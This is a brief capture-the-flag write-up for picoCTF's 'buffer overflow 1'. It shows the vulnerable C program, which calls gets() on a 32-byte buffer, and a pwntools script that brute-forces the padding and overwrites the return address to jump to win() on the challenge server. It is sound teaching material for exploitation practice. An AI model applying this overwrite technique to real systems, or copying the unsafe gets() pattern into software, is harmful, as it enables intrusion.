# buffer overflow 1

This challenge from [picoCTF](https://play.picoctf.org/practice/challenge/258) is a basic buffer overflow.

Looking at the code we can see that we need to overflow on `buf` using the `gets` function:

```c
#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

We need to change the adress of `get_return_address` with the adress of the `win` function wich we can retrieve using objdump:

```
❯ objdump -d vuln | grep win
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>
```

We know our buffer is 32 bytes long, I was lazy so I just bruteforced instead of trying to find the exact number of bytes required to write on the function pointer.

# Solve.py

```py
from pwn import *

context.log_level = 'error'

for i in range(20):
    payload = b'A' * (32+i) + p32(0x080491f6)
    r = remote('saturn.picoctf.net', 52655)
    r.recvuntil('Please enter your string:')
    r.sendline(payload)
    print(i, r.recvall()) # i = 12
```